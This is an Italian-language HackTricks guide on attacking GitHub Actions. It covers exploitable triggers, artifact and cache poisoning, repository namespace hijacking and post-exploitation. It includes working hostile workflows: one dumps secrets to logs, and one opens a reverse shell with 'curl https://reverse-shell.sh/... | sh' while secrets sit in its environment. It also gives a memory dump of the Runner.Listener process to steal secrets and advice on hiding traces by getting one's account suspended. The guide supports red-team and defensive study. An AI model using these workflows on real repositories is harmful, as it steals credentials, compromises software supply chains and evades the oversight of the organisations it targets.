# Abuso di Github Actions

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

In questa pagina troverai:

* Un **riassunto di tutti gli impatti** di un attaccante che riesce ad accedere a una Github Action
* Diversi modi per **accedere a un'azione**:
* Avere **permessi** per creare l'azione
* Abuso dei trigger correlati alle **pull request**
* Abuso di **altre tecniche di accesso esterne**
* **Pivot** da un repository gi√† compromesso
* Infine, una sezione sulle **tecniche di post-exploitation per abusare di un'azione dall'interno** (causando gli impatti menzionati)

## Riassunto degli impatti

Per una introduzione su [**Github Actions controlla le informazioni di base**](../basic-github-information.md#github-actions).

Nel caso in cui tu possa **eseguire azioni Github arbitrarie/iniettare codice** in un **repository**, potresti essere in grado di:

* **Rubare** i **secrets** da quel repo/organizzazione.
* Se puoi solo iniettare, puoi rubare tutto ci√≤ che √® gi√† presente nel workflow.
* Abuso dei **privilegi del repo** per accedere ad altre piattaforme come AWS e GCP.
* **Eseguire codice in workers personalizzati** (se vengono utilizzati workers personalizzati) e cercare di pivotare da l√¨.
* **Sovrascrivere** il **codice** del repository.
* Questo dipende dai privilegi del `GITHUB_TOKEN` (se presente).
* **Compromettere** **deployments** e altri **artefatti**.
* Se il codice sta distribuendo o memorizzando qualcosa, potresti modificarlo e ottenere ulteriore accesso.

## GITHUB\_TOKEN

Questo "**segreto**" (proveniente da `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) viene fornito quando l'amministratore abilita questa opzione:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Questo token √® lo stesso che verr√† utilizzato da una **Github Application**, quindi pu√≤ accedere agli stessi endpoint: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github dovrebbe rilasciare un [**flusso**](https://github.com/github/roadmap/issues/74) che **consente l'accesso tra repository** all'interno di GitHub, in modo che un repository possa accedere ad altri repository interni utilizzando il `GITHUB_TOKEN`.
{% endhint %}

Puoi vedere i possibili **permessi** di questo token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Nota che il token **scade dopo che il job √® stato completato**.\
Questi token hanno un aspetto del genere: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Alcune cose interessanti che puoi fare con questo token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Approva PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Crea PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Nota che in diverse occasioni potrai trovare **token di utenti di Github all'interno delle variabili d'ambiente di Github Actions o nei segreti**. Questi token potrebbero conferirti maggiori privilegi sul repository e sull'organizzazione.
{% endhint %}

<details>

<summary>Elencare i segreti nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni una shell inversa con le secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

√à possibile verificare i permessi concessi a un token di Github in altri repository degli utenti **controllando i log** delle azioni:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Esecuzione consentita

{% hint style="info" %}
Questo sarebbe il modo pi√π semplice per compromettere le azioni di Github, poich√© in questo caso si suppone che tu abbia accesso per **creare un nuovo repository nell'organizzazione**, o che tu abbia **privilegi di scrittura su un repository**.

Se ti trovi in questa situazione, puoi semplicemente controllare le [tecniche di post-exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Esecuzione dalla creazione del repository

Nel caso in cui i membri di un'organizzazione possano **creare nuovi repository** e tu possa eseguire azioni di Github, puoi **creare un nuovo repository e rubare i segreti impostati a livello di organizzazione**.

### Esecuzione da un nuovo branch

Se puoi **creare un nuovo branch in un repository che gi√† contiene una Github Action** configurata, puoi **modificarla**, **caricare** il contenuto e quindi **eseguire quella azione dal nuovo branch**. In questo modo puoi **esfiltrare i segreti a livello di repository e organizzazione** (ma devi sapere come vengono chiamati).

Puoi rendere l'azione modificata eseguibile **manualmente**, quando viene **creata una PR** o quando viene **inviato del codice** (a seconda di quanto rumoroso vuoi essere):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Esecuzione Forked

{% hint style="info" %}
Ci sono diversi trigger che potrebbero consentire a un attaccante di **eseguire un'azione di Github di un altro repository**. Se queste azioni triggerabili sono configurate in modo errato, un attaccante potrebbe essere in grado di comprometterle.
{% endhint %}

### `pull_request`

Il trigger del flusso di lavoro **`pull_request`** eseguir√† il flusso di lavoro ogni volta che viene ricevuta una pull request con alcune eccezioni: di default, se √® la **prima volta** che si sta **collaborando**, qualche **manutentore** dovr√† **approvare** l'**esecuzione** del flusso di lavoro:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Poich√© la **limitazione predefinita** riguarda i contributori **di prima volta**, √® possibile contribuire **correggendo un bug/errore valido** e quindi inviare **altri PR per abusare dei nuovi privilegi di `pull_request`**.

**Ho testato questo e non funziona**: ~~Un'altra opzione sarebbe creare un account con il nome di qualcuno che ha contribuito al progetto e ha eliminato il suo account.~~
{% endhint %}

Inoltre, di default **impedisce le autorizzazioni di scrittura** e l'**accesso alle segreti** del repository di destinazione come indicato nella [**documentazione**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Ad eccezione di `GITHUB_TOKEN`, **i segreti non vengono passati all'esecutore** quando un flusso di lavoro viene attivato da un repository **forked**. Il **`GITHUB_TOKEN` ha autorizzazioni di sola lettura** nelle pull request **da repository forked**.

Un attaccante potrebbe modificare la definizione dell'azione di Github per eseguire cose arbitrarie e aggiungere azioni arbitrarie. Tuttavia, non sar√† in grado di rubare segreti o sovrascrivere il repository a causa delle limitazioni menzionate.

{% hint style="danger" %}
**S√¨, se l'attaccante cambia nella PR l'azione di Github che verr√† attivata, la sua azione di Github sar√† quella utilizzata e non quella del repository di origine!**
{% endhint %}

Poich√© l'attaccante controlla anche il codice in esecuzione, anche se non ci sono segreti o autorizzazioni di scrittura sul `GITHUB_TOKEN`, un attaccante potrebbe ad esempio **caricare artefatti maligni**.

### **`pull_request_target`**

Il trigger del flusso di lavoro **`pull_request_target`** ha **autorizzazioni di scrittura** per il repository di destinazione e **accesso ai segreti** (e non richiede autorizzazione).

Si noti che il trigger del flusso di lavoro **`pull_request_target`** **viene eseguito nel contesto di base** e non in quello fornito dalla PR (per **non eseguire codice non attendibile**). Per ulteriori informazioni su `pull_request_target` [**consultare la documentazione**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Inoltre, per ulteriori informazioni su questo specifico uso pericoloso, consultare questo [**post del blog di Github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Potrebbe sembrare che poich√© il flusso di lavoro **eseguito** √® quello definito nella **base** e non nella PR, sia **sicuro** utilizzare **`pull_request_target`**, ma ci sono alcuni casi in cui non lo √®.

E questo avr√† **accesso ai segreti**.

### `workflow_run`

Il trigger [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) consente di eseguire un flusso di lavoro da un altro quando √® `completed`, `requested` o `in_progress`.

In questo esempio, un flusso di lavoro √® configurato per essere eseguito dopo che il flusso di lavoro separato "Run Tests" √® completato:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Inoltre, secondo la documentazione: Il flusso di lavoro avviato dall'evento `workflow_run` √® in grado di **accedere a segreti e scrivere token, anche se il flusso di lavoro precedente non lo era**.

Questo tipo di flusso di lavoro potrebbe essere attaccato se dipende da un flusso di lavoro che pu√≤ essere attivato da un utente esterno tramite **`pull_request`** o **`pull_request_target`**. Alcuni esempi vulnerabili possono essere trovati in [**questo blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Il primo consiste nel flusso di lavoro attivato da **`workflow_run`** che scarica il codice degli attaccanti: `${{ github.event.pull_request.head.sha }}`\
Il secondo consiste nel **passare** un **artifact** dal codice **non attendibile** al flusso di lavoro **`workflow_run`** e utilizzare il contenuto di questo artifact in modo che sia **vulnerabile a RCE**.

### `workflow_call`

TODO

TODO: Verificare se quando viene eseguito da un pull\_request il codice utilizzato/scaricato √® quello dell'origine o del pull request forkato

## Abuso dell'esecuzione forkata

Abbiamo menzionato tutti i modi in cui un attaccante esterno potrebbe riuscire a far eseguire un flusso di lavoro di GitHub, ora vediamo come queste esecuzioni, se configurate male, potrebbero essere abusate:

### Esecuzione del checkout non attendibile

Nel caso di **`pull_request`,** il flusso di lavoro verr√† eseguito nel **contesto del PR** (quindi eseguir√† il **codice dannoso dei PR**), ma qualcuno deve **autorizzarlo prima** e verr√† eseguito con alcune [limitazioni](./#pull\_request).

Nel caso di un flusso di lavoro che utilizza **`pull_request_target` o `workflow_run`** che dipende da un flusso di lavoro che pu√≤ essere attivato da **`pull_request_target` o `pull_request`**, verr√† eseguito il codice del repository originale, quindi l'**attaccante non pu√≤ controllare il codice eseguito**.

{% hint style="danger" %}
Tuttavia, se l'**azione** ha un **checkout PR esplicito** che **prende il codice dal PR** (e non dalla base), utilizzer√† il codice controllato dagli attaccanti. Ad esempio (controlla la riga 12 dove viene scaricato il codice del PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NON SICURO. Fornito solo come esempio.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Il codice potenzialmente **non attendibile viene eseguito durante `npm install` o `npm build`** poich√© gli script di compilazione e i pacchetti di riferimento sono controllati dall'autore del PR.

{% hint style="warning" %}
Una ricerca github per trovare azioni vulnerabili √®: `event.pull_request pull_request_target extension:yml` tuttavia, ci sono diversi modi per configurare i lavori in modo che vengano eseguiti in modo sicuro anche se l'azione √® configurata in modo non sicuro (come utilizzare condizioni su chi √® l'attore che genera il PR).
{% endhint %}

### Iniezioni di script nel contesto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Si noti che ci sono determinati [**contesti di GitHub**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) i cui valori sono **controllati** dall'**utente** che crea il PR. Se l'azione di GitHub utilizza questi dati per eseguire qualsiasi cosa, potrebbe portare all'esecuzione di codice arbitrario:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Iniezione di script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dalla documentazione: Puoi rendere una **variabile d'ambiente disponibile per qualsiasi passaggio successivo** in un lavoro di flusso di lavoro definendo o aggiornando la variabile d'ambiente e scrivendo questo nel file di ambiente **`GITHUB_ENV`**.

Se un attaccante potesse **iniettare qualsiasi valore** all'interno di questa **variabile d'ambiente**, potrebbe iniettare variabili d'ambiente che potrebbero eseguire codice nei passaggi successivi come **LD\_PRELOAD** o **NODE\_OPTIONS**.

Ad esempio ([**questo**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [**questo**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), immagina un flusso di lavoro che si fida di un artifact caricato per memorizzare il suo contenuto all'interno della variabile d'ambiente **`GITHUB_ENV`**. Un attaccante potrebbe caricare qualcosa del genere per comprometterlo:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Azioni di terze parti vulnerabili di Github

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Come menzionato in [**questo post del blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), questa Azione di GitHub consente di accedere a artifact da diversi flussi di lavoro e persino da repository.

Il problema √® che se il parametro **`path`** non √® impostato, l'artifact viene estratto nella directory corrente e pu√≤ sovrascrivere file che potrebbero essere successivamente utilizzati o persino eseguiti nel flusso di lavoro. Pertanto, se l'Artifact √® vulnerabile, un attaccante potrebbe sfruttarlo per compromettere altri flussi di lavoro che si fidano dell'Artifact.

Esempio di flusso di lavoro vulnerabile:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Questo pu√≤ essere attaccato con il seguente flusso di lavoro:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Altri accessi esterni

### Hijacking di un repository di un namespace eliminato

Se un account cambia nome, un altro utente potrebbe registrare un account con quel nome dopo un certo tempo. Se un repository aveva **meno di 100 stelle prima del cambio di nome**, Github permetter√† al nuovo utente registrato con lo stesso nome di creare un **repository con lo stesso nome** di quello eliminato.

{% hint style="danger" %}
Quindi, se un'azione sta utilizzando un repository di un account inesistente, √® ancora possibile che un attaccante possa creare quell'account e compromettere l'azione.
{% endhint %}

Se altri repository utilizzano **dipendenze da questi repository dell'utente**, un attaccante sar√† in grado di dirottare tali repository. Qui hai una spiegazione pi√π completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
In questa sezione parleremo di tecniche che consentirebbero di **passare da un repository a un altro** supponendo di avere qualche tipo di accesso al primo (controlla la sezione precedente).
{% endhint %}

### Cache Poisoning

Una cache viene mantenuta tra **esecuzioni di workflow nello stesso branch**. Ci√≤ significa che se un attaccante **compromette** un **pacchetto** che viene quindi memorizzato nella cache e **scaricato** ed eseguito da un workflow **con privilegi superiori**, sar√† in grado di **compromettere** anche quel workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

I workflow potrebbero utilizzare **artefatti da altri workflow e persino da repository**, se un attaccante riesce a **compromettere** l'azione di Github che **carica un artefatto** che viene successivamente utilizzato da un altro workflow, potrebbe **compromettere gli altri workflow**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation da un'azione

### Accesso ad AWS e GCP tramite OIDC

Controlla le seguenti pagine:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accesso a segreti <a href="#accessing-secrets" id="accessing-secrets"></a>

Se stai iniettando contenuto in uno script, √® interessante sapere come puoi accedere ai segreti:

* Se il segreto o il token √® impostato su una **variabile d'ambiente**, pu√≤ essere direttamente accessibile tramite l'ambiente utilizzando **`printenv`**.

<details>

<summary>Elencare i segreti nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni una shell inversa con le secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Se il segreto viene utilizzato **direttamente in un'espressione**, lo script shell generato viene memorizzato **su disco** ed √® accessibile.
* ```bash
cat /home/runner/work/_temp/*
```
* Per le azioni JavaScript, i segreti vengono inviati tramite variabili d'ambiente
* ```bash
ps axe | grep node
```
* Per una **azione personalizzata**, il rischio pu√≤ variare a seconda di come un programma utilizza il segreto ottenuto dall'**argomento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuso dei runner self-hosted

Il modo per scoprire quali **Github Actions vengono eseguite su infrastrutture non-Github** √® cercare **`runs-on: self-hosted`** nella configurazione yaml dell'azione Github.

I runner self-hosted potrebbero avere accesso a **informazioni extra sensibili**, ad altri **sistemi di rete** (endpoint vulnerabili nella rete? servizio di metadati?) o, anche se √® isolato e distrutto, **pi√π di un'azione potrebbe essere eseguita contemporaneamente** e quella malintenzionata potrebbe **rubare i segreti** dell'altra.

Nei runner self-hosted √® anche possibile ottenere i **secrets dal processo _Runner.Listener_** che conterr√† tutti i segreti dei flussi di lavoro in qualsiasi passaggio, scaricando la sua memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Controlla [**questo post per ulteriori informazioni**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro immagini Docker di Github

√à possibile creare azioni di Github che **creeranno e memorizzeranno un'immagine Docker all'interno di Github**.\
Un esempio pu√≤ essere trovato nel seguente espandibile:

<details>

<summary>Azione di Github per la creazione e l'invio di un'immagine Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Come puoi vedere nel codice precedente, il registro di Github √® ospitato in **`ghcr.io`**.

Un utente con permessi di lettura sul repository sar√† quindi in grado di scaricare l'immagine Docker utilizzando un token di accesso personale:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Successivamente, l'utente potrebbe cercare **segnreti trapelati nei livelli dell'immagine Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informazioni sensibili nei log di Github Actions

Anche se **Github** cerca di **rilevare i valori segreti** nei log delle azioni e **evitare di mostrarli**, **altri dati sensibili** che potrebbero essere generati durante l'esecuzione dell'azione non saranno nascosti. Ad esempio, un JWT firmato con un valore segreto non sar√† nascosto a meno che non sia [configurato specificamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Coprire le proprie tracce

(Tecnica da [**qui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prima di tutto, qualsiasi PR aperta √® chiaramente visibile al pubblico su Github e all'account GitHub di destinazione. Su GitHub, per impostazione predefinita, **non possiamo eliminare una PR da Internet**, ma c'√® un trucco. Per gli account Github che vengono **sospesi** da Github, tutte le loro **PR vengono automaticamente eliminate** e rimosse da Internet. Quindi, per nascondere la propria attivit√†, √® necessario ottenere la **sospensione del proprio account GitHub o far segnalare il proprio account**. Ci√≤ **nasconder√† tutte le attivit√†** su GitHub da Internet (in pratica, rimuover√† tutte le PR di exploit).

Un'organizzazione su GitHub √® molto attiva nel segnalare gli account a GitHub. Tutto ci√≤ che devi fare √® condividere "qualcosa" in un problema e si assicureranno che il tuo account venga sospeso in 12 ore :p e voil√†, hai reso invisibile il tuo exploit su github.

{% hint style="warning" %}
L'unico modo per un'organizzazione di capire di essere stata presa di mira √® controllare i log di GitHub da SIEM, poich√© dalla UI di GitHub la PR verrebbe rimossa.
{% endhint %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
